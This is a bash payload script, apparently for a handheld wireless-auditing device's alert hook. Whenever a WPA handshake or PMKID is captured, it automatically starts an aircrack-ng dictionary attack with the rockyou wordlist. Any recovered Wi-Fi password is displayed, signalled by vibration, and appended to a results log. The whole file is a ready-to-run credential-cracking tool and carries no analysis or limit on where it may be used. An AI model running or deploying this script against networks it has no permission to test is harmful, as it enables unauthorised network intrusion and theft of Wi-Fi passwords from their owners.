#!/bin/bash
# Title: Auto Handshake Cracker
# Author: sinX
# Description: Automatically cracks WPA handshakes using aircrack-ng when captured
# Version: 1.0
# Category: alerts

# ============================================
# CONFIGURATION
# ============================================
# Wordlist location - adjust to your wordlist path
WORDLIST="/root/wordlists/rockyou.txt"

# Maximum crack time in seconds (0 = unlimited)
MAX_CRACK_TIME=300

# Enable logging to file
ENABLE_LOGGING=true
LOG_FILE="/root/crack_results.log"

# Notify on success/failure
VIBRATE_ON_SUCCESS=true
ALERT_ON_SUCCESS=true

# ============================================
# ALERT HANDSHAKE VARIABLES (Auto-populated)
# ============================================
# $_ALERT_HANDSHAKE_AP_MAC - Access Point MAC
# $_ALERT_HANDSHAKE_CLIENT_MAC - Client MAC
# $_ALERT_HANDSHAKE_TYPE - EAPOL or PMKID
# $_ALERT_HANDSHAKE_COMPLETE - true/false
# $_ALERT_HANDSHAKE_CRACKABLE - true/false
# $_ALERT_HANDSHAKE_PCAP_FILE - Path to PCAP
# $_ALERT_HANDSHAKE_HASHCAT_FILE - Path to hashcat format

# ============================================
# MAIN EXECUTION
# ============================================

# Check if handshake is crackable
if [ "$_ALERT_HANDSHAKE_CRACKABLE" != "true" ]; then
    LOG red "Handshake not crackable, skipping..."
    exit 0
fi

# Check if wordlist exists
if [ ! -f "$WORDLIST" ]; then
    LOG red "Wordlist not found: $WORDLIST"
    ERROR_DIALOG "Wordlist missing: $WORDLIST"
    exit 1
fi

# Extract ESSID from handshake
ESSID=$(aircrack-ng "$_ALERT_HANDSHAKE_PCAP_FILE" 2>/dev/null | grep -oP "(?<=\().*(?=\))" | head -1)
if [ -z "$ESSID" ]; then
    ESSID="Unknown"
fi

LOG green "Handshake captured for: $ESSID"
LOG blue "AP MAC: $_ALERT_HANDSHAKE_AP_MAC"
LOG blue "Type: $_ALERT_HANDSHAKE_TYPE"

# Start cracking
LOG yellow "Starting crack attempt..."

# Run aircrack-ng with timeout if specified
if [ "$MAX_CRACK_TIME" -gt 0 ]; then
    timeout "$MAX_CRACK_TIME" aircrack-ng -w "$WORDLIST" -b "$_ALERT_HANDSHAKE_AP_MAC" "$_ALERT_HANDSHAKE_PCAP_FILE" > /tmp/crack_output.txt 2>&1
    CRACK_RESULT=$?
else
    aircrack-ng -w "$WORDLIST" -b "$_ALERT_HANDSHAKE_AP_MAC" "$_ALERT_HANDSHAKE_PCAP_FILE" > /tmp/crack_output.txt 2>&1
    CRACK_RESULT=$?
fi

# Check if password was found
PASSWORD=$(grep -oP "KEY FOUND! \[ \K[^\]]*" /tmp/crack_output.txt)

if [ -n "$PASSWORD" ]; then
    # Success!
    LOG green "PASSWORD CRACKED!"
    LOG green "ESSID: $ESSID"
    LOG green "Password: $PASSWORD"

    # Log to file if enabled
    if [ "$ENABLE_LOGGING" = true ]; then
        echo "$(date) | $ESSID | $_ALERT_HANDSHAKE_AP_MAC | $PASSWORD" >> "$LOG_FILE"
    fi

    # Alert user
    if [ "$ALERT_ON_SUCCESS" = true ]; then
        ALERT "Password Found!\n$ESSID\n$PASSWORD"
    fi

    if [ "$VIBRATE_ON_SUCCESS" = true ]; then
        VIBRATE
        sleep 0.5
        VIBRATE
    fi

elif [ "$CRACK_RESULT" -eq 124 ]; then
    # Timeout reached
    LOG yellow "Crack timeout reached ($MAX_CRACK_TIME seconds)"
    LOG yellow "Password not found in time"

else
    # Failed - password not in wordlist
    LOG red "Password not found in wordlist"
    LOG red "Consider using a larger wordlist"
fi

# Cleanup
rm -f /tmp/crack_output.txt

exit 0
